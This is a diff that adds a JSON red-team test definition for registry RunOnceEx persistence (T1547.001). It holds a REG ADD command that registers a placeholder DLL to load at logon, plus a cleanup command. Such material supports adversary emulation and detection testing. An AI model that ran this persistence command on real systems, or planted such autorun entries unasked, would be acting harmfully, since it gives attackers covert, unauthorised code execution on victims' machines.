@@ -1,0 +1,32 @@
+{
+    "name": "Reg Key RunOnce",
+    "description": "RunOnce Key Persistence.  Upon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout.  ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"#{thing_to_execute}\"\n",
+        "cleanup_command": "REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1547.001",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Registry Run Keys / Startup Folder",
+    "source": "ART",
+    "uuid": "554cbd88-cde1-4b56-8168-0be552eed9eb",
+    "arguments": {
+        "thing_to_execute": {
+            "description": "Thing to Run",
+            "type": "path",
+            "default": "C:\\Path\\AtomicRedTeam.dll"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
